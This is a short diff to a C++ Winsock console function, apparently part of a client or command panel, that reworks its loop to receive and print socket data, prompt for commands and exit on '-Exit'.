@@ -49,12 +49,20 @@ void Panel()
 
     // Do-while loop to send and receive data
     char buf[4096];
+
+    //
     string userInput;
 
-    do
+    while (true)
     {
+        ZeroMemory(buf, 4096);
+
+        int bytesReceived = recv(sock, buf, 4096, 0);
+        string command = string(buf, 0 , bytesReceived);
+
+        cout << command << endl;
         // Prompt the user for some text
-        cout << "Command> ";
+        cout << "Command -> ";
         getline(cin, userInput);
 
         if (userInput.size() > 0)		// Make sure the user has typed in something
@@ -62,11 +70,18 @@ void Panel()
             registerCommands(userInput, sock);
         }
 
-    } while (userInput.size() > 0);
+        // Exit Command To Panel
+        if (userInput == "-Exit")
+        {
+            break;
+        }
+    }
 
     // Gracefully close down everything
     closesocket(sock);
     WSACleanup();
+
+    cout << "Exit";
 }
 
 //
